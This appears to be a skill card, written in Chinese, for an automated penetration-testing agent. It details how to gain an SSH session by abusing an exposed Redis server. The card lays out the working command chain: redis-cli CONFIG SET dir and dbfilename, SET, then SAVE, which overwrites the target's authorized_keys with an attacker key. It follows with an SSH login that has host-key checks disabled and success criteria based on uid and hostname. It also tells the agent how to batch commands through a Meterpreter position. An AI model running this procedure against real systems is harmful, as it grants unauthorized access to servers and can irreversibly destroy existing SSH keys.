---
name: session-ssh-via-redis
description: Redis 写文件 → SSH 登录（支撑类 · provides=session）
id: session.ssh_via_redis
kind: session
runs_at: position
delivers: ["session"]
inputs: {"target_host":{"from":"runtime"},"ssh_user":{"from":"runtime"},"private_key_path":{"from":"config","optional":true},"public_key":{"from":"config","optional":true},"port":{"from":"config","optional":true},"ssh_port":{"from":"config","optional":true},"authorized_keys_dir":{"from":"config","optional":true},"authorized_keys_file":{"from":"config","optional":true},"redis_key":{"from":"config","optional":true},"restore":{"from":"config","optional":true}}
tools: ["cmd","code", "msf"]
---

# Redis 写文件 → SSH 登录（支撑类 · provides=session）

卡片 ID：`session.ssh_via_redis`。

## 何时用

目标 Redis 连接可达、SSH 可达，且 Redis 进程身份能写目标账户的 `authorized_keys`；调用方生成或持有本次使用的 SSH 密钥对。原方法适用于未授权或已知口令的连接，当前 fixed 入口没有认证入参。

执行点为能访问目标 Redis 与 SSH 的标准 POSIX 工具机，需具备 `redis-cli`、`ssh`、`ssh-keygen`、`sh`、`cat`；使用固定入口还需 `python3`。目标侧使用 `id`、`hostname`，恢复文件时使用 `rm`。SSH 不可达，或落点受 `StrictModes` / `AuthorizedKeysFile` 限制时不适用，须另行观察。

**先弄清"怎么把一串 Windows 命令行送进去"**：`position_speaks=shell` 时，命令行直接交给位置自己的 shell；`position_speaks=meterpreter` 时**照旧写 `{"tool":"cmd","cmd":"…"}`**（引擎按位置包装并**把回显带回来**）。**不要用 `execute -f <shell> -a "<命令行>"` 去跑命令**：它只回一句 `Process NNNN created.`、没有命令输出，你拿不到可引用的证据，最后只能判"不满足"，而命令其实跑了（2026-10-08 实测，两格因此把已经干成的活判成没成）。

## 怎么做

主路径使用 `ssh-keygen` 管理密钥，以 `redis-cli` 的 `CONFIG SET dir`、`CONFIG SET dbfilename`、`SET`、`SAVE` 写入公钥，再由 `ssh` 验证会话；写文件原语沿用 `exploit.redis_unauth_write`。

以下为既有入口的工具调用形状，参数由入口按 argv 绑定：
```sh
sh -c "test -f <key> || ssh-keygen -q -t ed25519 -N '' -C agv-session -f <key>"
# 未显式提供 public_key 时读取
cat <key>.pub
ssh-keygen -lf <key>.pub
redis-cli -h <host> -p <port> CONFIG SET dir <ssh_dir>
redis-cli -h <host> -p <port> CONFIG SET dbfilename <ssh_file>
redis-cli -h <host> -p <port> SET <redis_key> <pubkey_value>
redis-cli -h <host> -p <port> SAVE
ssh -i <key> -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o IdentitiesOnly=yes -o ConnectTimeout=8 -p <ssh_port> <user>@<host> '<wrapped_probe>'
```

> **这些是独立动作块**：一行一个块。多步就在一次回答里用 `{"actions":[…],"gap":1}` 批量给出（引擎按顺序执行、每块各记一条回执、块间默认歇 1 秒）；**不要把几行用 `&` 拼成一条长命令** —— 一处坏、整条废，长行还会把回执尾巴弄丢。

参数定义见 `skill.json`。`<host>`、`<user>` 对应运行现场的 `target_host`、`ssh_user`；其余已声明选项来自配置。`<key>` 为 `private_key_path`（省略时按执行点家目录解析为 `$HOME/.ssh/agv_session`，卡内不写死账号路径），`<ssh_dir>` / `<ssh_file>` 为 `authorized_keys_dir` / `authorized_keys_file`，文件名默认 `authorized_keys`。`<pubkey_value>` 为公钥前后各含两个实际换行的单个参数；`<wrapped_probe>` 为入口用本次 marker 包裹的 `id; hostname`。marker 用于核对本次输出，不是 Redis 键名。

上述工具就是本页的方法本身；当前流程由现场按本页流程给出命令。密钥类型与生成方式可由调用方选择或复用已有密钥，缺少私钥时入口按既有方式生成；未绑定 `private_key_path` 时，入口先解析执行点家目录再拼接 `.ssh/agv_session`；即使显式提供 `public_key`，指纹步骤仍读取 `<key>.pub`。落点、密钥及 `restore` 按已声明输入填写，不改变固定链、指纹绑定、验证口径或判据。

## 怎么判

阻断闸沿用 freshness、target、identity：

- freshness：核对本次 SSH 验证调用的执行状态、`call_id` 和原始输出中的 marker。
- target：对照本次目标与绑定输入，核对 hostname；`target_host` 来自输入，`session_host` 来自登录回显。
- identity：以 `id` 回显记录 `session_identity`，沿用 `uid==0 when the node that needs the session requires root`，由既有别名映射至 `uid0_when_node_requires_root`，按节点身份要求判定。

`effect_rule=session_identity_present` 保持为非阻断规则，读取 `session_identity` 或 `session_user`；后者来自输入，不能代替实际登录回显。证据字段保留 `call_id`、`target_host`、`session_user`、`session_identity`、`session_host`、`ssh_key_fingerprint`、`session_key_path`，原始输出为 `stdout`。会话可用性须核对 SSH 实际执行、身份与 hostname 回显，以及 `ssh-keygen -lf` 的公钥指纹；只有 `SAVE` 返回 OK 不算。

通过：三个阻断闸均为 `pass`。不满足：任一阻断闸返回 `unsatisfied`。不确定：没有阻断闸返回 `unsatisfied`，但存在缺失或不确定的证据；沿用 `on_missing_evidence=uncertain`，不猜填。

## 异常与恢复

`SAVE` 是覆盖写，会整份替换目标 `authorized_keys`。若原文件存在且没有其他读取途径，无法还原，必须如实记录；原文件不存在时，删除落地文件才可恢复文件原状，两种情况须区分。

公钥值须带换行，否则 RDB 尾部可能与公钥连在一起而导致 SSH 解析失败。RDB 是二进制，文件会混入不可打印字节，公钥行是否可解析须现场确认。写入权限由 Redis 进程身份决定；写 root 账户目录需对应权限。

`restore` 默认 true：入口在登录验证后尝试删除落地文件，将 Redis 的 `dir` 设为 `/`、`dbfilename` 设为 `dump.rdb`。入口未保存原配置，这不等于恢复任意原值，也无法恢复被覆盖的公钥文件。原卡要求的原值恢复与本次写入清理须据实际状态核对；入口没有删除承载公钥的 Redis 键。

`restore=false` 保留落地文件供下游复用；选择恢复时，本次会话仅作为验证证据。是否恢复由调用方按现场决定，覆盖风险与恢复情况均须如实记录。

[共享执行规则](../../src/skills/templates/execution_rules.txt)
